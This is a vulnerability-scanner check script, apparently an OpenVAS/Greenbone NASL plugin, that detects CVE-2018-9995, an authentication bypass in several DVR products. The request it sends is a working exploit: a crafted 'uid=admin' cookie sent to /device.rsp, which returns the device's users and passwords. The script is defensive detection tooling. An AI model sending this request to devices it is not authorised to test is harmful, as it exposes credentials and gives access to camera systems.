if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.141061" );
	script_version( "2021-05-27T06:00:15+0200" );
	script_tag( name: "last_modification", value: "2021-05-27 06:00:15 +0200 (Thu, 27 May 2021)" );
	script_tag( name: "creation_date", value: "2018-05-03 13:51:37 +0700 (Thu, 03 May 2018)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2019-10-03 00:03:00 +0000 (Thu, 03 Oct 2019)" );
	script_cve_id( "CVE-2018-9995" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_name( "Multiple DVR Products Authentication Bypass Vulnerability" );
	script_category( ACT_GATHER_INFO );
	script_copyright( "Copyright (C) 2018 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80, 88, 81, 82, 8080 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "Multiple DVR devices allow remote attackers to bypass authentication via a
  crafted cookie header." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_xref( name: "URL", value: "http://misteralfa-hack.blogspot.cl/2018/04/tbk-vision-dvr-login-bypass.html" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port, file: "/login.rsp" );
if(!ContainsString( banner, "Server: GNU rsp/" )){
	exit( 0 );
}
url = "/device.rsp?opt=user&cmd=list";
cookie = "uid=admin";
req = http_get_req( port: port, url: url, add_headers: make_array( "Cookie", cookie ) );
res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
if(ContainsString( res, "{\"result\":0" ) && ContainsString( res, "\"uid\"" )){
	report = "It was possible to bypass the authentication and list the available users and their passwords.\n\n" + "Result:\n" + res;
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

